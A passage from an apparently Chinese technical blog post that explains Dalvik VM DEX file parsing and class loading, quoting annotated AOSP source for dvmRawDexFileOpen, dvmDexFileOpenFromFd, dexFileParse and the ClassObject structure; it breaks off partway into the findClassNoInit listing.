<li>为Dex文件与相关数据结构建立映射关系</li>
<li>为Dex文件进行校验并计算SHA-1</li>
<li>保存设置并返回</li>
</ol>
<h3 id="函数执行流程-1"><a href="#函数执行流程-1" class="headerlink" title="函数执行流程"></a>函数执行流程</h3><p>Dex文件的解析工作主要由虚拟机源码目录dalvik/vm/RawDexFile.cpp中的<code>dvmRawDexFileOpen()</code>函数完成，这部分工作中称其为主控函数。<br><strong>代码清单</strong> dalvik/vm/RawDexFile.cpp: dvmRawDexFileOpen()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dvmRawDexFileOpen</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* fileName, <span class="keyword">const</span> <span class="keyword">char</span>* odexOutputName,</span></span></span><br><span class="line"><span class="function"><span class="params">    RawDexFile** ppRawDexFile, <span class="keyword">bool</span> isBootstrap)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明函数中间的执行变量</span></span><br><span class="line">    DvmDex* pDvmDex = <span class="literal">NULL</span>;     <span class="comment">// 用于在虚拟机中描述解析的Dex文件</span></span><br><span class="line">    <span class="keyword">char</span>* cachedName = <span class="literal">NULL</span>;    <span class="comment">// 用于保存执行期间产生的优化Dex文件名</span></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">-1</span>;            <span class="comment">// 设置函数返回值，0表示成功</span></span><br><span class="line">    <span class="keyword">int</span> dexFd = <span class="number">-1</span>;             <span class="comment">// 目标Dex文件的文件描述符</span></span><br><span class="line">    <span class="keyword">int</span> optFd = <span class="number">-1</span>;             <span class="comment">// 优化Dex文件的文件描述符</span></span><br><span class="line">    u4 modTime = <span class="number">0</span>;             <span class="comment">// 文件修改时间参数</span></span><br><span class="line">    u4 adler32 = <span class="number">0</span>;             <span class="comment">// 校验和</span></span><br><span class="line">    <span class="keyword">size_t</span> fileSize = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">bool</span> newFile = <span class="literal">false</span>;       <span class="comment">// 标示虚拟机是否需要对Dex文件进行优化</span></span><br><span class="line">    <span class="keyword">bool</span> locked = <span class="literal">false</span>;        <span class="comment">// 标示优化进程占用</span></span><br><span class="line">    <span class="comment">// fileName记录了Dex文件在文件系统中的绝对路径，用open函数根据fileName将目标文件读入内存</span></span><br><span class="line">    dexFd = open(fileName, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span> (dexFd &lt; <span class="number">0</span>) <span class="keyword">goto</span> bail;</span><br><span class="line">    <span class="comment">/* If we fork/exec into dexopt, don&#x27;t let it inherit the open fd. */</span></span><br><span class="line">    dvmSetCloseOnExec(dexFd);</span><br><span class="line">    <span class="comment">// 对dex文件的合法性与正确性进行检验</span></span><br><span class="line">    <span class="keyword">if</span> (verifyMagicAndGetAdler32(dexFd, &amp;adler32) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;Error with header for %s&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 记录文件修改时间并赋值给modTime</span></span><br><span class="line">    <span class="keyword">if</span> (getModTimeAndSize(dexFd, &amp;modTime, &amp;fileSize) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;Error with stat for %s&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 根据目标Dex文件名为其产生相应的Odex文件名，并赋值给cachedName</span></span><br><span class="line">    <span class="keyword">if</span> (odexOutputName == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        cachedName = dexOptGenerateCacheFileName(fileName, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (cachedName == <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        cachedName = strdup(odexOutputName);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ALOGV(<span class="string">&quot;dvmRawDexFileOpen: Checking cache for %s (%s)&quot;</span>,</span><br><span class="line">            fileName, cachedName);</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 尝试根据cachedName所指的Odex文件名在cache中查找并读取Odex文件，如果读取失败或是当前的Odex文件有误</span></span><br><span class="line"><span class="comment">     * 则需要重新对Dex文件进行优化(将newFile设为true)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    optFd = dvmOpenCachedDexFile(fileName, cachedName, modTime,</span><br><span class="line">        adler32, isBootstrap, &amp;newFile, <span class="comment">/*createIfMissing=*/</span><span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (optFd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGI(<span class="string">&quot;Unable to open or create cache for %s (%s)&quot;</span>,</span><br><span class="line">                fileName, cachedName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    locked = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//  虚拟机根据newFile的值决定是否对Dex文件进行优化</span></span><br><span class="line">    <span class="keyword">if</span> (newFile) &#123;</span><br><span class="line">        u8 startWhen, copyWhen, endWhen;</span><br><span class="line">        <span class="keyword">bool</span> result;</span><br><span class="line">        <span class="keyword">off_t</span> dexOffset;</span><br><span class="line"></span><br><span class="line">        dexOffset = lseek(optFd, <span class="number">0</span>, SEEK_CUR);</span><br><span class="line">        result = (dexOffset &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (result) &#123;</span><br><span class="line">            startWhen = dvmGetRelativeTimeUsec();</span><br><span class="line">            <span class="comment">// 将dexFd所指文件复制到optFd所指文件中</span></span><br><span class="line">            result = copyFileToFile(optFd, dexFd, fileSize) == <span class="number">0</span>;</span><br><span class="line">            copyWhen = dvmGetRelativeTimeUsec();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 调用dvmOptimizeDexFile函数对optFd所指文件进行优化</span></span><br><span class="line">        <span class="keyword">if</span> (result) &#123;</span><br><span class="line">            result = dvmOptimizeDexFile(optFd, dexOffset, fileSize,</span><br><span class="line">                fileName, modTime, adler32, isBootstrap);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!result) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;Unable to extract+optimize DEX from &#x27;%s&#x27;&quot;</span>, fileName);</span><br><span class="line">            <span class="keyword">goto</span> bail;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        endWhen = dvmGetRelativeTimeUsec();</span><br><span class="line">        ALOGD(<span class="string">&quot;DEX prep &#x27;%s&#x27;: copy in %dms, rewrite %dms&quot;</span>,</span><br><span class="line">            fileName,</span><br><span class="line">            (<span class="keyword">int</span>) (copyWhen - startWhen) / <span class="number">1000</span>,</span><br><span class="line">            (<span class="keyword">int</span>) (endWhen - copyWhen) / <span class="number">1000</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当Dex文件的优化结束后，将会调用dvmDexFileOpenFromFd函数对该Dex文件进行解析</span></span><br><span class="line">    <span class="keyword">if</span> (dvmDexFileOpenFromFd(optFd, &amp;pDvmDex) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGI(<span class="string">&quot;Unable to map cached %s&quot;</span>, fileName);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    ALOGV(<span class="string">&quot;Successfully opened &#x27;%s&#x27;&quot;</span>, fileName);</span><br><span class="line">    <span class="comment">// 对入口参数ppRawDexFile进行设置，其作用是用于保存当前处理的Dex文件的相关信息</span></span><br><span class="line">    *ppRawDexFile = (RawDexFile*) <span class="built_in">calloc</span>(<span class="number">1</span>, <span class="keyword">sizeof</span>(RawDexFile));</span><br><span class="line">    (*ppRawDexFile)-&gt;cacheFileName = cachedName; <span class="comment">// 保存Odex文件名</span></span><br><span class="line">    (*ppRawDexFile)-&gt;pDvmDex = pDvmDex; <span class="comment">// 保存DvmDex数据结构</span></span><br><span class="line">    cachedName = <span class="literal">NULL</span>;      <span class="comment">// don&#x27;t free it below</span></span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>dvmRawDexFileOpen()函数完成目标Dex文件优化后，会调用dvmDexFileOpenFromFd()函数完成Dex文件的后续解析工作。<br><strong>代码清单</strong> dalvik/vm/DvmDex.cpp: dvmDexFileOpenFromFd()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dvmDexFileOpenFromFd</span><span class="params">(<span class="keyword">int</span> fd, DvmDex** ppDvmDex)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 声明函数执行过程中所用到的中间变量</span></span><br><span class="line">    DvmDex* pDvmDex; <span class="comment">// 用于在虚拟机中描述解析的Dex文件</span></span><br><span class="line">    DexFile* pDexFile;</span><br><span class="line">    MemMapping memMap;</span><br><span class="line">    <span class="keyword">int</span> parseFlags = kDexParseDefault;</span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// 验证Dex文件校验和</span></span><br><span class="line">    <span class="keyword">if</span> (gDvm.verifyDexChecksum)</span><br><span class="line">        parseFlags |= kDexParseVerifyChecksum;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (lseek(fd, <span class="number">0</span>, SEEK_SET) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;lseek rewind failed&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 对目标Dex文件进行映射，并将其设置为只读文件</span></span><br><span class="line">    <span class="keyword">if</span> (sysMapFileInShmemWritableReadOnly(fd, &amp;memMap) != <span class="number">0</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;Unable to map file&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Dex文件解析的关键，dexFileParse函数对Dex文件解析，并返回一个DexFile数据结构的实例对象</span></span><br><span class="line">    pDexFile = dexFileParse((u1*)memMap.addr, memMap.length, parseFlags);</span><br><span class="line">    <span class="keyword">if</span> (pDexFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;DEX parse failed&quot;</span>);</span><br><span class="line">        sysReleaseShmem(&amp;memMap);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// allocateAuxStructures函数根据pDexFile对DvmDex数据结构的一些成员变量进行设置。</span></span><br><span class="line">    pDvmDex = allocateAuxStructures(pDexFile);</span><br><span class="line">    <span class="keyword">if</span> (pDvmDex == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        dexFileFree(pDexFile);</span><br><span class="line">        sysReleaseShmem(&amp;memMap);</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* tuck this into the DexFile so it gets released later */</span></span><br><span class="line">    sysCopyMap(&amp;pDvmDex-&gt;memMap, &amp;memMap);</span><br><span class="line">    pDvmDex-&gt;isMappedReadOnly = <span class="literal">true</span>;</span><br><span class="line">    *ppDvmDex = pDvmDex;</span><br><span class="line">    result = <span class="number">0</span>; <span class="comment">// 0表示成功</span></span><br><span class="line"></span><br><span class="line">bail:</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>dvmDexFileOpenFromFd()函数首先对已经优化的Dex文件进行正确性检验，随后调用dexFileParse()函数将目标文件进行解析，目标是将Dex文件与DexFile结构体建立关联。<br><strong>代码清单</strong> dalvik/libdex/DexFile.cpp: dexFileParse()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">DexFile* <span class="title">dexFileParse</span><span class="params">(<span class="keyword">const</span> u1* data, <span class="keyword">size_t</span> length, <span class="keyword">int</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    DexFile* pDexFile = <span class="literal">NULL</span>;   <span class="comment">// 结构体指针，用于保存和返回解析结果</span></span><br><span class="line">    <span class="keyword">const</span> DexHeader* pHeader;   <span class="comment">// 保存Dex文件头部信息</span></span><br><span class="line">    <span class="keyword">const</span> u1* magic;            <span class="comment">// 用于保存Dex文件的魔数</span></span><br><span class="line">    <span class="keyword">int</span> result = <span class="number">-1</span>;</span><br><span class="line">    <span class="comment">// Dex文件长度不能小于其文件头的长度</span></span><br><span class="line">    <span class="keyword">if</span> (length &lt; <span class="keyword">sizeof</span>(DexHeader)) &#123;</span><br><span class="line">        ALOGE(<span class="string">&quot;too short to be a valid .dex&quot;</span>);</span><br><span class="line">        <span class="keyword">goto</span> bail;      <span class="comment">/* bad file format */</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pDexFile = (DexFile*) <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(DexFile));</span><br><span class="line">    <span class="keyword">if</span> (pDexFile == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">goto</span> bail;      <span class="comment">/* alloc failure */</span></span><br><span class="line">    <span class="built_in">memset</span>(pDexFile, <span class="number">0</span>, <span class="keyword">sizeof</span>(DexFile));</span><br><span class="line">    <span class="comment">// 对目标文件的magic进行验证，确定其为一个优化的Dex文件</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">memcmp</span>(data, DEX_OPT_MAGIC, <span class="number">4</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        magic = data;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">memcmp</span>(magic+<span class="number">4</span>, DEX_OPT_MAGIC_VERS, <span class="number">4</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            ALOGE(<span class="string">&quot;bad opt version (0x%02x %02x %02x %02x)&quot;</span>,</span><br><span class="line">                 magic[<span class="number">4</span>], magic[<span class="number">5</span>], magic[<span class="number">6</span>], magic[<span class="number">7</span>]);</span><br><span class="line">            <span class="keyword">goto</span> bail;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 将优化文件头部与DexFile数据结构的pOptHeader成员变量关联</span></span><br><span class="line">        pDexFile-&gt;pOptHeader = (<span class="keyword">const</span> DexOptHeader*) data;</span><br><span class="line">        ALOGV(<span class="string">&quot;Good opt header, DEX offset is %d, flags=0x%02x&quot;</span>,</span><br><span class="line">            pDexFile-&gt;pOptHeader-&gt;dexOffset, pDexFile-&gt;pOptHeader-&gt;flags);</span><br><span class="line">        <span class="comment">// 对优化数据进行处理，将各个优化数据与DexFile数据结构中的相应成员变量进行关联</span></span><br><span class="line">        <span class="keyword">if</span> (!dexParseOptData(data, length, pDexFile))</span><br><span class="line">            <span class="keyword">goto</span> bail;</span><br><span class="line">        <span class="comment">// 用data变量记录当前文件所分析到的位置，length记录还有多少内容没分析</span></span><br><span class="line">        data += pDexFile-&gt;pOptHeader-&gt;dexOffset;</span><br><span class="line">        length -= pDexFile-&gt;pOptHeader-&gt;dexOffset;</span><br><span class="line">        <span class="keyword">if</span> (pDexFile-&gt;pOptHeader-&gt;dexLength &gt; length) &#123;</span><br><span class="line">	        ALOGE(<span class="string">&quot;File truncated? stored len=%d, rem len=%d&quot;</span>,</span><br><span class="line">                pDexFile-&gt;pOptHeader-&gt;dexLength, (<span class="keyword">int</span>) length);</span><br><span class="line">            <span class="keyword">goto</span> bail;</span><br><span class="line">        &#125;</span><br><span class="line">        length = pDexFile-&gt;pOptHeader-&gt;dexLength;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 从data所标示的位置将Dex文件中其他各部分数据与DexFile数据结构建立完整的映射关系</span></span><br><span class="line">    dexFileSetupBasicPointers(pDexFile, data);</span><br><span class="line">    pHeader = pDexFile-&gt;pHeader;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!dexHasValidMagic(pHeader)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> bail;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 验证Dex文件校验和</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; kDexParseVerifyChecksum) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 验证SHA-1值</span></span><br><span class="line">    <span class="keyword">if</span> (kVerifySignature) &#123;</span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> pDexFile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>随着dexFileParse函数结束，Dex文件的解析也告一段落，类加载机制接下来的工作就是根据虚拟机的运行需要，从Dex文件中加载指定类，并将其装入虚拟机的运行时环境中。</p>
<h2 id="运行时环境数据加载"><a href="#运行时环境数据加载" class="headerlink" title="运行时环境数据加载"></a>运行时环境数据加载</h2><h3 id="ClassObject数据结构"><a href="#ClassObject数据结构" class="headerlink" title="ClassObject数据结构"></a>ClassObject数据结构</h3><p>类加载的最终目标就是为目标类生成一个ClassObject的实例对象，并将其存储在运行时环境中，随时被执行模块引用执行。<br><strong>代码清单</strong> dalvik/vm/oo/Object.h</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ClassObject</span> :</span> Object &#123;</span><br><span class="line">    u4           instanceData[CLASS_FIELD_SLOTS];</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>*  descriptor;          <span class="comment">// 类描述符</span></span><br><span class="line">    <span class="keyword">char</span>*        descriptorAlloc;</span><br><span class="line">    u4           accessFlags;         <span class="comment">// 访问标志符</span></span><br><span class="line">    u4           serialNumber;        <span class="comment">// 虚拟机独有的类序列号</span></span><br><span class="line">    DvmDex*      pDvmDex;             <span class="comment">// 指向所属Dex文件</span></span><br><span class="line">    ClassStatus  status;              <span class="comment">// 类初始化状态</span></span><br><span class="line">    ClassObject* verifyErrorClass;    <span class="comment">// 错误处理</span></span><br><span class="line">    u4           initThreadId;        <span class="comment">// 初始化进程ID</span></span><br><span class="line">    <span class="keyword">size_t</span>       objectSize;          <span class="comment">// 总共的object数</span></span><br><span class="line">    ClassObject* elementClass;        <span class="comment">// 元素类</span></span><br><span class="line">    <span class="keyword">int</span>          arrayDim;            <span class="comment">// 数组维数</span></span><br><span class="line">    PrimitiveType primitiveType;      <span class="comment">// 原始类型索引</span></span><br><span class="line">    ClassObject* super;               <span class="comment">// 指向超类</span></span><br><span class="line">    Object*      classLoader;         <span class="comment">// 类装载器</span></span><br><span class="line">    InitiatingLoaderList initiatingLoaderList;</span><br><span class="line">    <span class="comment">/* 这个类中直接实现的接口的数组 */</span></span><br><span class="line">    <span class="keyword">int</span>          interfaceCount;</span><br><span class="line">    ClassObject** interfaces;</span><br><span class="line">    <span class="comment">/* 直接方法 */</span></span><br><span class="line">    <span class="keyword">int</span>          directMethodCount;</span><br><span class="line">    Method*      directMethods;</span><br><span class="line">    <span class="comment">/* 这个类中定义的虚方法，通过vtable调用 */</span></span><br><span class="line">    <span class="keyword">int</span>          virtualMethodCount;</span><br><span class="line">    Method*      virtualMethods;</span><br><span class="line">    <span class="comment">/* 虚方法表 */</span></span><br><span class="line">    <span class="keyword">int</span>          vtableCount;</span><br><span class="line">    Method**     vtable;</span><br><span class="line">    <span class="comment">/* interface table */</span></span><br><span class="line">    <span class="keyword">int</span>             iftableCount;</span><br><span class="line">    InterfaceEntry* iftable;</span><br><span class="line">    <span class="comment">/* 常量池 */</span></span><br><span class="line">    <span class="keyword">int</span>          ifviPoolCount;</span><br><span class="line">    <span class="keyword">int</span>*         ifviPool;</span><br><span class="line">    <span class="comment">/* 实例字段 */</span></span><br><span class="line">    <span class="keyword">int</span>          ifieldCount;</span><br><span class="line">    <span class="keyword">int</span>          ifieldRefCount;</span><br><span class="line">    InstField*   ifields;</span><br><span class="line">    </span><br><span class="line">    u4           refOffsets;        <span class="comment">// 字段区偏移量</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>*  sourceFile;        <span class="comment">// 源文件名</span></span><br><span class="line">    <span class="comment">/* 静态字段 */</span></span><br><span class="line">    <span class="keyword">int</span>          sfieldCount;</span><br><span class="line">    StaticField  sfields[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="类加载整体流程"><a href="#类加载整体流程" class="headerlink" title="类加载整体流程"></a>类加载整体流程</h3><ul>
<li>获取描述Dex文件的DexFile结构体对象</li>
<li>根据目标类属性选择相应的加载模式</li>
<li>在DexFile数据结构中获取目标类数据在Dex文件中的分布信息</li>
<li>将类数据信息传给实际加载函数</li>
</ul>
<h3 id="函数执行流程-2"><a href="#函数执行流程-2" class="headerlink" title="函数执行流程"></a>函数执行流程</h3><p><code>dalvik/vm/native/dalvik_system_DexFile.cpp</code>中的Dalvik_dalvik_System_DexFile_defineClassNative为这一阶段的主控函数。<br>Dalvik_dalvik_system_DexFile_defineClassNative-&gt;dvmGetRawDexFileDex-&gt;dvmDefineClass-&gt;findClassNoInit完成实际的加载工作。<br><strong>代码清单</strong> dalvik/vm/oo/Class.cpp: findClassNoInit()</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span 